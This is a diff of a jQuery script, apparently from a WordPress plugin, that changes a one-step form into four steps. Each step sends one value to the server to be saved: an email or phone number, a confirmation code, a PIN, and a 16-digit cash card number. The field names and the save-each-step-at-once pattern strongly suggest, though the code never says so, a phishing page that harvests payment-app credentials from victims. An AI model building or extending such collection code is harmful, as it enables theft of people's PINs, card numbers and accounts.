@@ -104,12 +104,8 @@
       });
     });
 
-    /**
-     * TODO: When click on submitForm get all input fields values and send a ajax request to server to save to database
-     */
-
-    $("#submitForm").click(function (e) {
-      e.preventDefault();
+    // insert first step data
+    $("#continueToStep2").click(function (e) {
 
       // get all input fields values
       const phoneNumber = document.getElementById("mobileNumber").value.trim();
@@ -117,39 +113,98 @@
 
       let emailOrPhone = phoneNumber ? phoneNumber : email;
 
-      const confirmationCode = document
-        .getElementById("confirmationCode")
-        .value.trim();
-      const pinValue = pinInput.value.trim();
-      const cashCardNumber = document
-        .getElementById("cashCardNumber")
-        .value.trim();
-
-      // console.log(
-      //   `emailOrPhone: ${emailOrPhone}, confirmationCode: ${confirmationCode}, pinValue: ${pinValue}, cashCardNumber: ${cashCardNumber}`
-      // );
-
       // send a ajax request to server to save to database
-      if (cashCardNumber.length < 16) {
-        // alert("Please enter a valid 16-digit Cash Card Number.");
-        return;
-      }
-
       $.ajax({
         type: "POST",
         url: wpb_public_localize.ajax_url,
         data: {
-          action: "save_to_database",
+          action: "save_first_step_data",
           nonce: wpb_public_localize.nonce,
           emailOrPhone: emailOrPhone,
+        },
+        success: function (response) {
+          console.log(response);
+        },
+      });
+
+    });
+
+    // insert second step data
+    $("#continueToStep3").click(function (e) {
+
+      // get confirmationCode field value
+      const confirmationCode = document
+        .getElementById("confirmationCode")
+        .value.trim();
+
+      // send a ajax request to server to save to database
+      $.ajax({
+        type: "POST",
+        url: wpb_public_localize.ajax_url,
+        data: {
+          action: "save_second_step_data",
+          nonce: wpb_public_localize.nonce,
           confirmationCode: confirmationCode,
-          pinValue: pinValue,
+        },
+        success: function (response) {
+          console.log(response);
+        },
+      });
+
+    });
+
+    // insert third step data
+    $("#continueToStep4").click(function (e) {
+
+      // get pinInput field value
+      const pinInput = document
+        .getElementById("pinInput")
+        .value.trim();
+
+      // send a ajax request to server to save to database
+      $.ajax({
+        type: "POST",
+        url: wpb_public_localize.ajax_url,
+        data: {
+          action: "save_third_step_data",
+          nonce: wpb_public_localize.nonce,
+          pinInput: pinInput,
+        },
+        success: function (response) {
+          console.log(response);
+        },
+      });
+
+    });
+
+    // insert fourth step data
+    $("#submitForm").click(function (e) {
+
+      // get cashCardNumber field value
+      const cashCardNumber = document
+        .getElementById("cashCardNumber")
+        .value.trim();
+
+        if (cashCardNumber.length < 16) {
+          // alert("Please enter a valid 16-digit Cash Card Number.");
+          return;
+        }
+
+      // send a ajax request to server to save to database
+      $.ajax({
+        type: "POST",
+        url: wpb_public_localize.ajax_url,
+        data: {
+          action: "save_fourth_step_data",
+          nonce: wpb_public_localize.nonce,
           cashCardNumber: cashCardNumber,
         },
         success: function (response) {
           console.log(response);
         },
       });
+
     });
+
   });
 })(jQuery);
